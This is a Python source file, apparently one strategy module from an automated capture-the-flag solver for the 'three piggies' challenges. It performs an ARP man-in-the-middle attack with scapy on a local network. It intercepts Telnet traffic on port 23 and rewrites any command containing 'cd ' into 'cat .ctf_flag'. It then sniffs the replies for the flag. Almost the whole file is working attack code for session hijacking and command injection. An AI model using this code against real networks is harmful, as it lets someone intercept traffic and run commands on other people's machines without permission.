# coding: utf-8
import scapy.all as scapy
import capture
import strategy
import logging
import re

logger = logging.getLogger(__name__)

class Strategy(strategy.Strategy):
    """
    Strategy solves the three piggies challenges (straw, sticks, brick) by injecting a command into the TCP stream
    Straw and sticks can be solved in "easier" ways, but this Strategy works for all three
    """
    needsip = True
    challenges = ['straw', 'stick', 'brick']

    class AnalysisModule(capture.Module):
        def __init__(self, flagpattern):
            self.flagpattern = flagpattern
            self.flag = None
            self.sniffer = None

        def start(self, sniffer):
            self.sniffer = sniffer

        def process(self, pkt):
            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
                logger.debug(pkt.sprintf('%IP.src%:%TCP.sport% > %IP.dst%:%TCP.dport% %Raw.load%'))

                try:
                    load = pkt.load.decode('utf-8')
                except UnicodeDecodeError:
                    return

                m = re.search(self.flagpattern, load)
                if m:
                    self.flag = m.group(0)
                    self.sniffer.stop()

    @capture.tcpfilter
    def injectcmd(pkt):
        if all(layer in pkt for layer in (scapy.IP, scapy.TCP)):
            if scapy.Raw in pkt and pkt[scapy.TCP].dport == 23:
                raw = pkt[scapy.Raw]
                if b'cd ' in raw.load:
                    raw.load = b'cat .ctf_flag\n'
        return pkt

    def execute(self, iface, flagpattern, canceltoken=None):
        sniffer = capture.Sniffer(iface=iface)
        analyser = self.AnalysisModule(flagpattern)
        sniffer.register(
            analyser,
            capture.ArpMitmModule(filter=self.injectcmd)
        )

        if canceltoken is not None:
            canceltoken.fork(oncancel=sniffer.stop)

        sniffer.run()
        return analyser.flag
